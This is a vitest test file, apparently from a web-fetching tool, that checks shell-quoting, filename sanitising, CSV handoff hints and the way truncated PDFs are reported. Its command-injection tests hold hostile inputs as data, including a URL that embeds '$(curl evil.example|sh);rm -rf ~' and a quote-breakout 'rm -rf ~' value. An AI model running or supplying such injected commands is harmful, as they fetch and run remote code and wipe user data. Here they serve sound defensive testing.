import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { cleanupCacheDir } from "./helpers/tempCache.js";

// core.tsはモジュール読み込み時にPageCache(node:sqlite)を既定のキャッシュディレクトリ
// (~/.cache/amenbo)に生成する副作用を持つため、テスト用の一時ディレクトリへ退避させてから
// importする(実ユーザーのキャッシュを汚さないため)。stdio接続(server.tsのrunServer())は
// isDirectlyExecutedガードにより直接実行時のみ走るため、core.tsをimportしてもハングしない。
const cacheDir = mkdtempSync(join(tmpdir(), "amenbo-server-test-"));
process.env.AMENBO_CACHE_DIR = cacheDir;

const { cache } = await import("../src/core.js");
const { formatHandoffResponse, formatPdfImageResponse, formatPdfResponseFromCache, dataSourcesSection, guessFilename, shellQuoteSingle, buildScreenshotContent } = await import("../src/formatting.js");
type HandoffResultLike = Parameters<typeof formatHandoffResponse>[0];

afterAll(() => {
  // Windows CI対応: 開いたままのSQLiteファイルハンドルを解放してから削除する
  // (詳細はtests/helpers/tempCache.tsのコメント参照)。
  cleanupCacheDir(cacheDir, () => cache.close());
});

function makeHandoff(overrides: Partial<HandoffResultLike> = {}): HandoffResultLike {
  return {
    handoff: true,
    finalUrl: "https://example.jp/data/r5.csv",
    status: 200,
    contentType: "text/csv; charset=utf-8",
    bytes: new TextEncoder().encode("id,name\n1,a\n2,b\n"),
    declaredSize: 16,
    truncated: false,
    ...overrides,
  };
}

describe("Critical #1: シェルコマンドインジェクション対策(CWE-78)", () => {
  it("guessFilenameは英数字・.・-・_以外を_に置換する", () => {
    expect(guessFilename("https://example.com/data/$(touch-pwned).csv")).toBe("__touch-pwned_.csv");
    expect(guessFilename("https://example.com/data/a;rm-rf.csv")).toBe("a_rm-rf.csv");
    expect(guessFilename("https://example.com/data/normal-file_1.csv")).toBe("normal-file_1.csv");
  });

  it("guessFilenameはパスが取れない場合downloadにフォールバックする", () => {
    expect(guessFilename("not a url")).toBe("download");
    expect(guessFilename("https://example.com/")).toBe("download");
  });

  it("shellQuoteSingleは単一引用符を安全にエスケープする", () => {
    expect(shellQuoteSingle("hello")).toBe("'hello'");
    expect(shellQuoteSingle("it's")).toBe("'it'\\''s'");
  });

  it("formatHandoffResponseは悪意あるURL(コマンド置換・パイプ・セミコロンを含む)でもhint行が安全に単一引用符化される", () => {
    const maliciousUrl = "https://example.com/data/$(curl evil.example|sh);rm -rf ~.csv";
    const handoff = makeHandoff({ finalUrl: maliciousUrl, declaredSize: null, truncated: false });

    const text = formatHandoffResponse(handoff, 8000);
    const hintLine = text.split("\n").find((line) => line.startsWith("hint:"));
    expect(hintLine).toBeDefined();

    // finalUrlは単一引用符でクォートされ、中の'は無い(URLに'は含まれないため丸ごとクォート文字列として安全)
    expect(hintLine).toContain(`'${maliciousUrl}'`);

    // ファイル名部分(-o の直後、URLより前)には $ ; | ` などシェル特殊文字が含まれない
    const oFlagMatch = hintLine!.match(/-o (\S+) '/);
    expect(oFlagMatch).not.toBeNull();
    const filenameArg = oFlagMatch![1]!;
    expect(filenameArg).toMatch(/^[A-Za-z0-9._-]+$/);
  });

  it("formatHandoffResponseはURL自体に単一引用符を含む場合も安全にエスケープする", () => {
    const handoff = makeHandoff({ finalUrl: "https://example.com/data/a'; rm -rf ~ #.csv" });
    const text = formatHandoffResponse(handoff, 8000);
    const hintLine = text.split("\n").find((line) => line.startsWith("hint:"))!;

    // 単一引用符コンテキストの外に出て `;` 等が解釈される余地が無いことを検証する:
    // シェルの単一引用符エスケープ規則('\'')に従って変換されているはず
    expect(hintLine).toContain("a'\\''; rm -rf ~ #.csv");
  });
});

describe("dataSourcesSection", () => {
  it("ヒントが空なら空文字を返す(トークン増ゼロ)", () => {
    expect(dataSourcesSection([])).toBe("");
  });

  it("ヒントがあればdata_sources:セクションを付与する", () => {
    const section = dataSourcesSection(["- 令和5年度データ — https://example.jp/data/r5.csv"]);
    expect(section).toBe("\n\ndata_sources:\n- 令和5年度データ — https://example.jp/data/r5.csv");
  });
});

describe("機能B: formatHandoffResponse", () => {
  it("CSVはプレビュー(ヘッダ+データ行)とcurl誘導を含む正常応答になる(エラーにならない)", () => {
    const handoff = makeHandoff();
    const text = formatHandoffResponse(handoff, 8000);

    expect(text).toContain("content_type: text/csv");
    expect(text).toContain("mode_used: handoff");
    expect(text).toContain("id,name");
    expect(text).toContain("hint:");
    expect(text).toContain("curl -L -o");
  });

  it("declaredSizeがAMENBO_MAX_BODY_BYTESを超える場合はプレビューを省略し、メタデータ+誘導のみにする", () => {
    const oversizedHandoff = makeHandoff({ declaredSize: 100 * 1024 * 1024 }); // 100MB > 既定20MB
    const text = formatHandoffResponse(oversizedHandoff, 8000);

    expect(text).not.toContain("id,name");
    expect(text).toContain("hint:");
  });

  it("バイナリ系(zip等)はメタデータのみでプレビュー本文を含まない", () => {
    const handoff = makeHandoff({ contentType: "application/zip", bytes: new Uint8Array([1, 2, 3]) });
    const text = formatHandoffResponse(handoff, 8000);
    expect(text).toContain("content_type: application/zip");
    expect(text).toContain("hint:");
  });

  it("項目7: ネットワーク層でtruncated:trueの場合、text/plain等でも部分プレビューの注記が付く", () => {
    const handoff = makeHandoff({
      contentType: "text/plain",
      bytes: new TextEncoder().encode("hello world"),
      declaredSize: null,
      truncated: true,
    });
    const text = formatHandoffResponse(handoff, 8000);
    expect(text).toContain("先頭部分");
  });
});

describe("設計ドキュメント§5回帰テスト: screenshot経路ではdata_sourcesが付与されない", () => {
  it("buildScreenshotContentの応答テキストにはdata_sources:が一切含まれない", () => {
    const content = buildScreenshotContent(
      { title: "テストページ" },
      {
        finalUrl: "https://example.jp/",
        tiles: [{ data: Buffer.from([0]) }],
        cacheStatus: "miss",
        pageWidth: 100,
        pageHeight: 100,
        truncated: false,
      },
      null,
    );

    const textBlocks = content.filter((block): block is { type: "text"; text: string } => block.type === "text");
    for (const block of textBlocks) {
      expect(block.text).not.toContain("data_sources:");
    }
  });
});

describe("formatPdfResponseFromCache(ページ数上限で打ち切ったPDFの申告)", () => {
  function cachedPdf(metadata: Record<string, unknown>) {
    return {
      url: "https://example.com/huge.pdf",
      etag: null,
      lastModified: null,
      markdown: "## ページ 1\n\n本文",
      metadata,
      fetchedAt: 0,
    };
  }

  it("打ち切っている場合はキャッシュから返す応答でも抽出ページ数を出す", () => {
    const text = formatPdfResponseFromCache(
      "https://example.com/huge.pdf",
      cachedPdf({ title: "大部の資料", finalUrl: "https://example.com/huge.pdf", pdfPageCount: 5000, pdfExtractedPageCount: 3000 }),
      8000,
      1,
    );

    expect(text).toContain("pdf_pages: 5000");
    // 申告が落ちると、利用者は全ページ分のテキストが手元にあると誤解する
    expect(text).toContain("pdf_pages_extracted: 3000");
  });

  it("打ち切っていない場合は余計な行を出さない", () => {
    const text = formatPdfResponseFromCache(
      "https://example.com/small.pdf",
      cachedPdf({ title: "資料", finalUrl: "https://example.com/small.pdf", pdfPageCount: 3, pdfExtractedPageCount: 3 }),
      8000,
      1,
    );

    expect(text).toContain("pdf_pages: 3");
    expect(text).not.toContain("pdf_pages_extracted");
  });
});

describe("formatPdfImageResponse(テキスト層の無いPDFの申告)", () => {
  it("全ページを判定できている場合はPDF全体について述べる", () => {
    const text = formatPdfImageResponse("スキャン資料", "https://example.com/scan.pdf", 12, 12, 10);

    expect(text).toContain("reason: PDFにテキスト層がありません(スキャンPDFの可能性)。全12ページ中先頭10ページを画像化");
  });

  it("ページ数上限で打ち切っている場合は判定範囲を明示する", () => {
    // 先頭がスキャンで後半にテキスト層があるPDFがあるため、全体について言い切ると誤申告になる
    const text = formatPdfImageResponse("大部の資料", "https://example.com/huge.pdf", 5000, 3000, 10);

    expect(text).toContain("先頭3000ページにテキスト層がありません(ページ数上限のため全体は判定していません)");
    expect(text).not.toContain("PDFにテキスト層がありません");
  });
});
